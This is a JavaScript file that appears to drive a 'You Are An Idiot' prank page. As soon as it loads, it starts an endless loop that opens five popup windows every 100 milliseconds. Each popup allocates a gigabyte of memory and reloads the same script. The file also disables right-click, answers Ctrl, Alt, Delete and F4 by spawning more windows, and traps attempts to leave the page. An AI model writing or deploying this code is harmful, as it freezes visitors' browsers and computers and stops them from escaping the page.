document.addEventListener('click', musicPlay);

function musicPlay() {
    var audio = document.getElementById('youare-audio');
    var micon = document.getElementById('youare-micon');

    micon.addEventListener('click', musicPlay);

    if (audio.duration > 0 && audio.paused) {
        audio.play();
        micon.src = "images/speaker.png";
    } else {
        audio.pause();
        audio.currentTime = 0;

        micon.src = "images/speakerm.png";
    }

    document.removeEventListener('click', musicPlay);
}

var faudio = new Audio('youare.mp3');

faudio.addEventListener('timeupdate', function () {
    console.log('TimeUpdate invoked.');

    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

function bookmark() {
    if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
        var url = "lol.html";
        var title = "Idiot!";

        window.external.AddFavorite(url, title);
    }
}

function changeTitle(title) {
    document.title = title;
}

function openWindow(url) {
    var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 357; // Keep within bounds
        var screenHeight = screen.height - 330;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);

        // Write custom content inside the blank page
        newWin.document.write(`
            <html>
            <head>
                <script src="you.js"></script>
                <title>YOU ARE AN IDIOT</title>
                <style>
                    body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                </style>
                <script>
                    const x = new Uint8Array(1024 * 1024 * 1024 * 1).fill(255); // 1GiB
                </script>
            </head>
            <body>
                <h1>You are an IDIOT!</h1>
                <script>
                    setInterval(() => {
                        document.body.style.background = document.body.style.background === 'red' ? 'blue' : 'red';
                    }, 500);
                </script>
            </body>
            </html>
        `);
    }

    return newWin;
}

function proCreate() {
    setInterval(() => {
        for (var i = 0; i < 5; i++) {
            openWindow('lol.html');
        }
    }, 100); // Adjust delay as needed
}

window.oncontextmenu = function () {
    return false;
};

window.onkeydown = function () {
    var keyCode = event.keyCode;

    if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {
        alert("You are an idiot!");
        proCreate();
    }

    return null;
};

window.onbeforeunload = function () {
    return "Are you an idiot?";
};

// Self-executing function to start immediately
(function () {
    // Open new windows after 1 second
    //setTimeout(function () {
        proCreate();
    //}, 1000);
})();
